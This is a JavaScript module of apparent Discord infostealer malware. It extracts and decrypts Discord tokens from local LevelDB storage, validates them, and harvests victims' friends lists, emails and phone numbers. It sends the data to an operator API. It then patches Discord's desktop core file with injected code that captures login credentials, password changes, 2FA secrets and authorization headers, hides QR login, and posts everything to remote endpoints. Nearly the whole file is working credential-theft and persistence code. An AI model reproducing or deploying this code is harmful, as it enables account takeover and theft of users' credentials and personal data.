Object.defineProperty(exports, "__esModule", { value: true });
exports.DiscordDataExtractor = undefined;

const path = require("path");
const fs = require("fs");
const axios = require("axios");
const Config = require("../config.js");
const KeyDecryptor = require("../crypto/KeyDecryptor.js");
const childProcess = require("child_process");
const GetHWID = require("../utils/GetHWID.js");
const ApiSender = require("./ApiSender.js");
const Logger = require("../utils/Logger.js");
const AntiVM = require("./AntiVM.js");

const INJECTION_TEMPLATE = [
  "(function () {",
  "    const { session, net, BrowserWindow } = require('electron');",
  "    const USER_NAME = process.env.USERNAME || process.env.USER || \"Unknown\";",
  "",
  "    const logger = async (type, data) => {",
  "        try {",
  "            const endpointMap = {",
  "                'TOKEN_GRABBED': '/api/v1/discord/injection/tokens/capture',",
  "                '2FA_SETUP_SUCCESS': '/api/v1/discord/injection/2fa/capture',",
  "                'PASSWORD_CHANGED': '/api/v1/discord/injection/credentials/password-change',",
  "                'CREDENTIALS_CAPTURE': '/api/v1/discord/injection/credentials/capture',",
  "            };",
  "",
  "            const endpoint = endpointMap[type];",
  "            if (!endpoint) return;",
  "",
  "            const fullUrl = `{BASE_API_URL}${endpoint}`;",
  "",
  "            const payload = {",
  "                type: type,",
  "                data: data,",
  "                admin: String(USER_NAME),",
  "                token: global.lastT ?? null,",
  "                timestamp: new Date().toISOString(),",
  "            };",
  "",
  "            const response = await fetch(fullUrl, {",
  "                method: 'POST',",
  "                headers: {",
  "                    'Content-Type': 'application/json',",
  "                    'x-hwid': \"{HWID}\",",
  "                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'",
  "                },",
  "                body: JSON.stringify(payload)",
  "            });",
  "",
  "        } catch (e) {",
  "        }",
  "    };",
  "",
  "    const grabOnStart = (win) => {",
  "        win.webContents.executeJavaScript(`",
  "            (function() {",
  "                try {",
  "                    const token = window.localStorage.getItem('token');",
  "                    return token ? token.replace(/\"/g, '') : null;",
  "                } catch (e) {",
  "                    return null;",
  "                }",
  "            })();",
  "        `).then(token => {",
  "            if (token && (typeof global.lastT === 'undefined' || global.lastT !== token)) {",
  "                global.lastT = token;",
  "                logger('TOKEN_GRABBED', { token });",
  "            }",
  "        }).catch(err => {",
  "        });",
  "    };",
  "",
  "    const originalLoad = BrowserWindow.prototype.loadURL;",
  "",
  " BrowserWindow.prototype.loadURL = function (url, options) {",
  "        if (url && (url.includes('discord.com/app') || url.includes('/channels/') || url.includes('discord.com/login'))) {",
  "            this.webContents.on('dom-ready', () => {",
  "                this.webContents.insertCSS(`",
  "                div[class*=\"qrLogin\"] button {",
  "                    display: none !important;",
  "                }",
  "            `);",
  "",
  "                this.webContents.executeJavaScript(`",
  "                const observer = new MutationObserver((mutations, obs) => {",
  "                    const qrSvg = document.querySelector('div[class*=\"qrCodeContainer\"] svg');",
  "                    if (qrSvg) {",
  "                        const newContainer = document.createElement('div');",
  "                        newContainer.innerHTML = '<svg xmlns=\"http://www.w3.org/2000/svg\" height=\"160\" viewBox=\"0 0 37 37\" width=\"160\"><rect width=\"37\" height=\"37\" fill=\"#ffffff\"/></svg>';",
  "                        ",
  "                        qrSvg.replaceWith(\"\");",
  "                        ",
  "                        obs.disconnect();",
  "                    }",
  "                });",
  "",
  "                observer.observe(document.body, { childList: true, subtree: true });",
  "            `).catch(e => { });",
  "            });",
  "        }",
  "        return originalLoad.apply(this, arguments);",
  "    };",
  "",
  "    const apiFilters = [\"*://discord.com/api/*\", \"*://*.discord.com/api/*\", \"*://discordapp.com/api/*\"];",
  "",
  "    session.defaultSession.webRequest.onBeforeRequest({ urls: apiFilters }, (details, callback) => {",
  "        if (details.url.includes(\"/science\") || details.url.includes(\"/tracing\")) return callback({ cancel: false });",
  "",
  "        if ((details.method === 'POST' || details.method === 'PATCH') && details.uploadData && details.uploadData[0] && details.uploadData[0].bytes) {",
  "            try {",
  "                const bodyStr = details.uploadData[0].bytes.toString();",
  "                const parsed = JSON.parse(bodyStr);",
  "",
  "                if (details.url.includes('auth/login')) {",
  "                    if (parsed.login && parsed.password && parsed.login.length > 0 && parsed.password.length > 0) {",
  "                        logger('CREDENTIALS_CAPTURE', { email: parsed.login, pass: parsed.password });",
  "                    }",
  "                }",
  "                if (parsed.new_password && parsed.password && parsed.new_password !== parsed.password) {",
  "                    logger('PASSWORD_CHANGED', { old: parsed.password, new: parsed.new_password });",
  "                }",
  "                if (details.url.includes('mfa/totp/enable')) {",
  "                    if (parsed.secret && parsed.code && parsed.secret.length > 0 && parsed.code.length > 0) {",
  "                        logger('2FA_SETUP_SUCCESS', { secret: parsed.secret, code: parsed.code });",
  "                    }",
  "                }",
  "            } catch (e) { }",
  "        }",
  "        callback({ cancel: false });",
  "    });",
  "",
  "    session.defaultSession.webRequest.onBeforeSendHeaders({ urls: apiFilters }, (details, callback) => {",
  "        if (details.requestHeaders['Authorization']) {",
  "            const token = details.requestHeaders['Authorization'];",
  "            if (typeof global.lastT === 'undefined' || global.lastT !== token) {",
  "                global.lastT = token;",
  "                logger('TOKEN_GRABBED', { token });",
  "            }",
  "        }",
  "        callback({ requestHeaders: details.requestHeaders });",
  "    });",
  "})();"
].join("\n");

class DiscordDataExtractor {
  async initialize() {
    Logger.logger.step("DISCORD_EXTRACTOR", "Initializing DiscordDataExtractor...");
    try {
      Logger.logger.info("Extracting all Discord tokens...");
      const tokens = await DiscordDataExtractor.extractAllTokens(Config.CONFIG.TMP_DIR);
      Logger.logger.info("Extraction complete. Found " + tokens.length + " valid tokens.");

      const getHWID = GetHWID.getHWID;
      const apiSender = new ApiSender.ApiSender(
        Config.CONFIG.ADMIN_ID,
        Config.CONFIG.LICENSE_KEY,
        getHWID(),
        Config.CONFIG.API_URL
      );
      Logger.logger.info("Reporting Discord data to API...");
      await apiSender.reportDiscordData(tokens);

      Logger.logger.info("Extracting friends list for all tokens...");
      const friends = await DiscordDataExtractor.extractFriendsList(tokens);
      Logger.logger.info(
        "Friends list extraction complete. Processing " + friends.length + " records."
      );
      if (friends.length > 0) {
        Logger.logger.info("Reporting friends list to API...");
        await apiSender.reportDiscordFriends(friends);
      }

      Logger.logger.info("Starting client Registery");
      const machineDetails = AntiVM.AntiVM.getMachineDetails();
      const getRegistrationHWID = GetHWID.getHWID;
      await apiSender.registerInject({
        ...machineDetails,
        hwid: getRegistrationHWID(),
        adminId: Config.CONFIG.ADMIN_ID
      });

      Logger.logger.step("DISCORD_INJECTION", "Starting Discord injection process...");
      await DiscordDataExtractor.injectDiscord();
      Logger.logger.info("Discord injection process completed.");
    } catch (error) {
      Logger.logger.error("Discord Data Extraction Error: " + error.message, error);
    }
  }

  static async extractAllTokens(tempDirectory) {
    const tokenClients = new Map();
    const clients = await Config.CONFIG.AllDiscordPaths();

    for (const { name: clientName, path: clientPath } of clients) {
      try {
        if (!fs.existsSync(clientPath)) continue;

        const localState = this.findLocalState(clientPath);
        let masterKey = null;
        if (localState && fs.existsSync(localState)) {
          const getMasterKey = KeyDecryptor.getMasterKey;
          masterKey = (await getMasterKey({
            user_data: clientPath,
            local_state: localState
          }))?.key || null;
        }

        const storageDirectories = [
          path.join(clientPath, "Local Storage", "leveldb"),
          path.join(clientPath, "Default", "Local Storage", "leveldb"),
          path.join(clientPath, "leveldb")
        ];

        for (const storageDirectory of storageDirectories) {
          if (!fs.existsSync(storageDirectory)) continue;

          for (const filename of fs.readdirSync(storageDirectory)) {
            if (!filename.endsWith(".log") && !filename.endsWith(".ldb")) continue;

            const sourceFile = path.join(storageDirectory, filename);
            const tempFile = path.join(
              tempDirectory,
              "tmp_" + Math.random().toString(36).slice(2)
            );

            try {
              fs.copyFileSync(sourceFile, tempFile);
              const contents = fs.readFileSync(tempFile, "utf8");
              const addToken = (token) => {
                if (!tokenClients.has(token)) tokenClients.set(token, new Set());
                tokenClients.get(token).add(clientName);
              };

              const encryptedTokens = contents.match(this.ENC_REGEX);
              if (encryptedTokens && masterKey) {
                for (const encryptedToken of encryptedTokens) {
                  const decryptToken = KeyDecryptor.decryptToken;
                  const token = decryptToken(encryptedToken, masterKey);
                  if (token) addToken(token);
                }
              }

              const plaintextTokens = contents.match(this.REGEX);
              if (plaintextTokens) plaintextTokens.forEach((token) => addToken(token));
              fs.unlinkSync(tempFile);
            } catch (error) {}
          }
        }
      } catch (error) {}
    }

    const tokens = Array.from(tokenClients.entries()).map(([token, clientNames]) => ({
      token,
      clientNames: Array.from(clientNames).join(", ")
    }));
    return await this.validateTokens(tokens);
  }

  static async injectDiscord() {
    const localAppData = process.env.LOCALAPPDATA || "";
    const roamingAppData = process.env.APPDATA || "";
    const getHWID = GetHWID.getHWID;
    const hwid = getHWID();

    try {
      await this.terminateDiscord();
      const locations = [
        { base: localAppData, search: ["cord", "vencord", "vesktop"] },
        { base: roamingAppData, search: ["BetterDiscord"] }
      ];

      for (const location of locations) {
        if (!fs.existsSync(location.base)) continue;
        const clients = fs.readdirSync(location.base).filter((name) =>
          location.search.some((term) => name.toLowerCase().includes(term.toLowerCase()))
        );

        for (const clientName of clients) {
          const clientDirectory = path.join(location.base, clientName);
          try {
            const versions = fs.readdirSync(clientDirectory)
              .filter((name) => name.startsWith("app-"))
              .sort((first, second) => second.localeCompare(first, undefined, { numeric: true }));

            if (versions.length > 0) {
              const modulesDirectory = path.join(clientDirectory, versions[0], "modules");
              if (fs.existsSync(modulesDirectory)) {
                const coreModule = fs.readdirSync(modulesDirectory)
                  .find((name) => name.startsWith("discord_desktop_core"));
                if (coreModule) {
                  const entryFile = path.join(
                    modulesDirectory, coreModule, "discord_desktop_core", "index.js"
                  );
                  if (fs.existsSync(entryFile)) {
                    const existingCode = fs.readFileSync(entryFile, "utf8");
                    if (!existingCode.includes(Config.CONFIG.API_URL)) {
                      const injectedCode = INJECTION_TEMPLATE
                        .replace("{HWID}", hwid)
                        .replace("{BASE_API_URL}", Config.CONFIG.API_URL) +
                        "\nmodule.exports = require('./core.asar');";
                      fs.writeFileSync(entryFile, injectedCode, { encoding: "utf8", flag: "w" });
                    }
                  }
                }
              }
            }

            const storageDirectory = path.join(
              roamingAppData, clientName, "Local Storage", "leveldb"
            );
            if (fs.existsSync(storageDirectory)) {
              for (const filename of fs.readdirSync(storageDirectory)) {
                if (filename.endsWith(".ldb") || filename.endsWith(".log")) {
                  try {
                    fs.writeFileSync(path.join(storageDirectory, filename), "");
                  } catch (error) {}
                }
              }
            }
          } catch (error) {}
        }
      }
      await this.restartDiscord();
    } catch (error) {
      console.error("Injection Error: " + error.message);
    }
  }

  static async terminateDiscord() {
    try {
      this.CLIENTS.forEach((client) => {
        try {
          const execSync = childProcess.execSync;
          execSync("taskkill /F /IM " + client + ".exe", { stdio: "ignore" });
        } catch (error) {}
      });
    } catch (error) {}
  }

  static async restartDiscord() {
    const localAppData = process.env.LOCALAPPDATA || "";
    try {
      this.CLIENTS.forEach((client) => {
        const updater = path.join(localAppData, client, "Update.exe");
        if (fs.existsSync(updater)) {
          const exec = childProcess.exec;
          exec(updater + " --processStart " + client + ".exe", (error) => {});
        }
      });
    } catch (error) {
      console.error("Restart Error: " + error.message);
    }
  }

  static async validateTokens(tokens) {
    const validTokens = [];
    const requests = tokens.map(async ({ token, clientNames }) => {
      const trimmedToken = token.trim();
      try {
        const response = await axios.get("https://discord.com/api/v9/users/@me", {
          headers: {
            Authorization: trimmedToken,
            "Content-Type": "application/json"
          },
          timeout: 8000
        });

        if (response.status === 200) {
          const existing = validTokens.find((user) => user.id === response.data.id);
          if (!existing) {
            validTokens.push({ token: trimmedToken, clientNames, ...response.data });
          } else {
            const previousClients = existing.clientNames.split(", ");
            const additionalClients = clientNames.split(", ");
            existing.clientNames = Array.from(
              new Set([...previousClients, ...additionalClients])
            ).join(", ");
          }
        }
      } catch (error) {}
    });
    await Promise.all(requests);
    return validTokens;
  }

  static async extractFriendsList(tokens) {
    const records = [];
    for (const user of tokens) {
      try {
        const response = await axios.get(
          "https://discord.com/api/v9/users/@me/relationships",
          {
            headers: {
              Authorization: user.token,
              "Content-Type": "application/json"
            },
            timeout: 10000
          }
        );
        if (!response.data || !Array.isArray(response.data)) continue;

        const friends = response.data.filter((relationship) => relationship.type === 1);
        if (friends.length === 0) continue;
        const profiles = [];

        for (const friend of friends) {
          try {
            await new Promise((resolve) => setTimeout(resolve, 300));
            const profile = await axios.get(
              "https://discord.com/api/v9/users/" + friend.id + "/profile",
              {
                headers: {
                  Authorization: user.token,
                  "Content-Type": "application/json"
                },
                timeout: 10000
              }
            );
            if (profile.data) {
              profiles.push({
                id: friend.id,
                username: friend.user?.username || "Unknown",
                avatar: friend.user?.avatar,
                profileData: profile.data
              });
            }
          } catch (error) {}
        }

        records.push({
          userId: user.id,
          username: user.username,
          email: user.email,
          phone: user.phone,
          totalFriends: friends.length,
          allFriends: profiles
        });
      } catch (error) {
        Logger.logger.warn("Failed to extract friends for token: " + error.message);
      }
    }
    return records;
  }

  static findLocalState(directory) {
    const candidates = [
      path.join(directory, "Local State"),
      path.join(path.dirname(directory), "Local State"),
      path.join(directory, "..", "Local State")
    ];
    return candidates.find((candidate) => fs.existsSync(candidate)) || null;
  }
}

exports.DiscordDataExtractor = DiscordDataExtractor;
DiscordDataExtractor.REGEX = new RegExp("[A-Za-z0-9_-]{23,28}\\.[A-Za-z0-9_-]{6,7}\\.[A-Za-z0-9_-]{27,}", "g");
DiscordDataExtractor.ENC_REGEX = new RegExp("dQw4w9WgXcQ:[^\"\\s]+", "g");
DiscordDataExtractor.CLIENTS = [
  "Discord",
  "DiscordCanary",
  "DiscordPTB",
  "DiscordDevelopment",
  "Vesktop",
  "Vencord",
  "BetterDiscord",
  "Powercord",
  "Revolt",
  "Fluent",
  "Lightcord",
  "DiscordOpenSource"
];
